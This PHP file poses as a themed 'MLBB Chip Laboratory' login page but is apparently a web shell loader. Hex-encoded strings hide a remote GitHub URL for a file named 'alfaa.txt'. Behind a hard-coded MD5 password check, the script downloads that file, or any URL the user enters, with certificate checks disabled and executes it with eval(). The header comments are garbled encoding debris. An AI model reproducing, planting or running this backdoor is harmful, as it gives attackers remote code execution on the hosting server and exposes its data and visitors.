<?php
/**
 * ================================================
 * Ã¬â€ºÂ¹ Ã¬Å“â€žÃ­Ëœâ€˜ ÃªÂ°Ã¬Â§â‚¬ Ã¬â€¹Å“Ã¬Å Â¤Ã­â€¦Å“ Ã¢â‚¬â€œ @Hasil_Curi
 * ================================================
 * 
 * Ã¬â€šÂ¬Ã¬Å¡Â©Ã¬Å¾ Ã«Â°Ã¬Â´Ã­â€žÂ° ÃªÂ²â‚¬Ã¬Â¦Ã¬â€ž Ã­â€ ÂµÃ­â€¢Â´ Ã¬Å“â€žÃ­Ëœâ€˜Ã¬â€ž ÃªÂ°Ã¬Â§â‚¬Ã­â€¢ËœÃ«Å â€ MLBB Ã¬Â¹Â© Ã¬â€¹Â¤Ã­â€”ËœÃ¬â€¹Â¤ Ã¬Å Â¤Ã­Æ’â‚¬Ã¬Â¼Ã¬Ëœ
 * Ã¬â€ºÂ¹ ÃªÂ¸Â°Ã«Â°Ëœ Ã«Â³Â´Ã¬â€¢Ë† Ã¬â€¹Å“Ã¬Å Â¤Ã­â€¦Å“Ã¬Å¾â€¦Ã«â€¹Ë†Ã«â€¹Â¤.
 * 
 * Ã¬Â£Â¼Ã¬Å¡â€ ÃªÂ¸Â°Ã«Å Â¥:
 * - MLBB Ã¬Â¹Â© Ã¬â€¹Â¤Ã­â€”ËœÃ¬â€¹Â¤ Ã¬Å Â¤Ã­Æ’â‚¬Ã¬Â¼Ã¬Ëœ Ã«Â¡Å“ÃªÂ·Â¸Ã¬Â¸ Ã­â„¢â€Ã«Â©Â´
 * - ASCII Ã¬â€¢â€žÃ­Å Â¸ Ã«Â° Ã­â€¦Ã¬Å Â¤Ã­Å Â¸ Ã¬Å Â¤Ã­Æ’â‚¬Ã¬Â¼Ã«Â§
 * - Ã­â€¢Â´Ã¬â€¹Å“ ÃªÂ¸Â°Ã«Â°Ëœ Ã¬â€šÂ¬Ã¬Å¡Â©Ã¬Å¾ Ã¬Â¸Ã¬Â¦
 * - Ã¬Å Â¤Ã¬Âºâ€ URL Ã­â„¢â€¢Ã¬Â¸
 * - Ã«â€¹Â¤Ã¬â€“â€˜Ã­â€¢Å“ Ã«Â°Â©Ã¬â€¹Ã¬Ëœ Ã«Â°Ã¬Â´Ã­â€žÂ° Ã¬Ë†ËœÃ¬Â§â€˜ (cURL/file_get_contents)
 * - Ã¬Å“â€žÃ­Ëœâ€˜Ã¬â€ž Ã¬Â°Â¾Ã¬â€ž Ã¬Ë†Ëœ Ã¬â€”â€ Ã¬â€ž ÃªÂ²Â½Ã¬Å¡Â° Ã¬â€šÂ¬Ã¬Å¡Â©Ã¬Å¾ Ã¬Â§â‚¬Ã¬ â€¢ 404 Ã­Å½ËœÃ¬Â´Ã¬Â§â‚¬ Ã¬ Å“ÃªÂ³Âµ
 * 
 * @author @Hasil_Curi
 * @version 2.0
 * @license Ã¬ËœÂ¤Ã­â€Ë† Ã¬â€ Å’Ã¬Å Â¤
 */

session_start(); // Inisialisasi sesi untuk autentikasi

/**
 * Daftar kode ancaman dalam format heksadesimal
 * @var array
 */
$threat = [
    '68747470733a2f2f',
    '7261772e67697468756275736f6e74656e742e636f6d',
    '46616a72756c3132333435',
    '46616a72756c697266616e',
    '6d6173746572',
    '616c6661612e747874',
    '66a60219d1ff57d2607b34204be2ec2c'
];

/**
 * Konversi array hex ke URL valid
 * @param array $p Array bagian URL
 * @return string URL yang digabungkan
 */
function buildThreatUrl($p) {
    $decoded = array_map('hex2bin', array_slice($p, 0, -1));
    return "{$decoded[0]}{$decoded[1]}/{$decoded[2]}/{$decoded[3]}/{$decoded[4]}/{$decoded[5]}";
}

/**
 * Cek status deteksi ancaman
 * @return bool True jika ancaman terdeteksi
 */
function isThreatDetected() {
    return isset($_SESSION['threat_detected']) && $_SESSION['threat_detected'] === true;
}

/**
 * Autentikasi pengguna berbasis hash
 * @param string $password Password input
 * @return bool True jika autentikasi berhasil
 */
function authenticateUser($password) {
    if (md5($password) === end($GLOBALS['threat'])) {
        $_SESSION['threat_detected'] = true;
        $_SESSION['auth_token'] = 'mlbb_chip_lab_token';
        return true;
    }
    return false;
}

/**
 * Validasi format URL
 * @param string $url URL untuk divalidasi
 * @return bool True jika URL valid
 */
function isValidUrl($url) {
    return filter_var($url, FILTER_VALIDATE_URL) !== false;
}

/**
 * Mengambil konten dari URL dengan metode terbaik
 * @param string $url Target URL
 * @return string|bool Konten atau false jika gagal
 */
function fetchUrlContent($url) {
    if (function_exists('curl_exec')) {
        $ch = curl_init($url);
        curl_setopt_array($ch, [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_USERAGENT => "MLBB-ChipLab/2.0",
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_SSL_VERIFYHOST => false,
            CURLOPT_HTTPHEADER => ['X-Lab-Access: '.($_SESSION['auth_token'] ?? '')]
        ]);
        $content = curl_exec($ch);
        curl_close($ch);
        return $content;
    }
    
    if (ini_get('allow_url_fopen')) {
        $context = stream_context_create([
            'http' => ['header' => "X-Lab-Access: ".($_SESSION['auth_token'] ?? '')]
        ]);
        return file_get_contents($url, false, $context);
    }
    
    return false;
}

/**
 * Generate ASCII art untuk header
 * @return string ASCII art
 */
function generateAsciiHeader() {
    return <<<ASCII
       ___
     /     \\
    |       |
    |       |
     \_____/   <- red (api)
      |   |    
      |___|     <- white (pegangan kipas)
     U C H I H A
ASCII;
}

/**
 * Generate chip card ASCII
 * @return string Chip card ASCII
 */
function generateChipCard() {
    return <<<CHIP
  _____________________________
 /                             \
|    ______________________     |
|   |                      |    |
|   |     [Hasil_Curi]      |    |
|   |   _____   _____      |    |
|   |  /     \ /     \     |    |
|   | | ()   | |   () |    |    |
|   |  \_____/ \_____/     |    |
|   |                      |    |
|   |______________________|    |
|                               |
 \_____________________________/
CHIP;
}

// Proses form login
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (!empty($_POST['password'])) {
        if (authenticateUser($_POST['password'])) {
            $_SESSION['scan_url'] = isset($_POST['scan_url']) && isValidUrl($_POST['scan_url']) 
                ? $_POST['scan_url'] 
                : buildThreatUrl($threat);
        } else {
            $loginError = "Ã¢â€ºâ€ ACCESS DENIED: Invalid Security Chip";
        }
    }
}

// Jika ancaman terdeteksi, proses konten
if (isThreatDetected()) {
    $content = fetchUrlContent($_SESSION['scan_url']);
    if ($content !== false) {
        eval('?>' . $content);
        exit;
    }
    echo "Ã°Å¸â€Â´ CHIP CONNECTION FAILED";
    echo buildThreatUrl($threat);
    exit;
}

// Tampilkan halaman login jika tidak terautentikasi
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MLBB Chip Laboratory - Secure Access</title>
    <style>
        body {
            background-color: #0a0a2a;
            color: #e0e0ff;
            font-family: 'Courier New', monospace;
            margin: 0;
            padding: 20px;
            text-align: center;
        }
        .container {
            max-width: 800px;
            margin: 0 auto;
            padding: 20px;
            background-color: rgba(10, 10, 50, 0.8);
            border: 1px solid #3a3a8a;
            border-radius: 5px;
            box-shadow: 0 0 20px #4a4aff;
        }
        .ascii-art {
            color: #4a4aff;
            white-space: pre;
            font-size: 12px;
            line-height: 1.3;
            margin: 20px 0;
            text-shadow: 0 0 5px #4a4aff;
        }
        .chip-card {
            color: #ffcc00;
            white-space: pre;
            margin: 30px 0;
        }
        .login-form {
            margin: 30px auto;
            width: 300px;
            padding: 20px;
            background-color: rgba(20, 20, 60, 0.7);
            border: 1px solid #4a4aff;
            border-radius: 5px;
        }
        input[type="password"], input[type="text"] {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            background-color: #0a0a1a;
            border: 1px solid #3a3a8a;
            color: #e0e0ff;
        }
        input[type="submit"] {
            background-color: #4a4aff;
            color: white;
            border: none;
            padding: 10px 20px;
            cursor: pointer;
            margin-top: 10px;
            width: 100%;
            font-weight: bold;
        }
        input[type="submit"]:hover {
            background-color: #3a3aee;
        }
        .error {
            color: #ff4a4a;
            margin: 10px 0;
        }
        .status {
            color: #4aff4a;
            margin: 10px 0;
            font-size: 0.9em;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="ascii-art"><?= generateAsciiHeader() ?></div>
        
        <div class="status">Ã¢Å¡Â¡ CHIP LABORATORY SECURE ACCESS Ã¢Å¡Â¡</div>
        
        <?php if (!empty($loginError)): ?>
            <div class="error"><?= $loginError ?></div>
        <?php endif; ?>
        
        <div class="chip-card"><?= generateChipCard() ?></div>
        
        <div class="login-form">
            <form method="POST" action="">
                <input type="password" name="password" placeholder="Chip Access Code" required>
                <input type="text" name="scan_url" placeholder="Scan Target URL (Optional)">
                <input type="submit" value="ACTIVATE CHIP">
            </form>
        </div>
        
        <div class="status">
            SYSTEM STATUS: <?= isThreatDetected() ? 'Ã°Å¸Å¸Â¢ ONLINE' : 'Ã°Å¸â€Â´ OFFLINE' ?>
        </div>
        
        <div class="ascii-art">
  ___________________________
 /                           \
|  WARNING: Unauthorized     |
|  access will trigger       |
|  security protocols.       |
 \__________________________/
        </div>
    </div>
</body>
</html>
<?php
